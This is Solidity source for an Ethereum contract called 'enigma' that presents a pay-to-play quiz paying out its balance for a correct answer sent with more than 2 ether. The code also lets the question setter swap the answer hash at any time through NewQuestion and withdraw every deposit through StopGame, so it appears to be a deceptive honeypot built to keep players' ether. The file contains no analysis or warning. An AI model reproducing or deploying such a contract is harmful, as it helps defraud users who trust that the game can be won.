/**
 * Source Code first verified at https://etherscan.io on Tuesday, March 26, 2019
 (UTC) */

pragma solidity ^0.4.25;

contract enigma
{

    function Try(string _response) external payable {
        require(msg.sender == tx.origin);

        if(responseHash == keccak256(_response) && msg.value > 2 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }

    string public question;

    address questionSender;

    bytes32 responseHash;

    bytes32 questionerPin = 0xa9b89a1e6417eaea191cbc0fceb86034342f4c2c9aba05ccdee661c8911d9b2a;

    function Activate(bytes32 _questionerPin, string _question, string _response) public payable {
        if(keccak256(_questionerPin)==questionerPin) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
            questionerPin = 0x0;
        }
    }

    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }

    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }

    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }

    function() public payable{}
}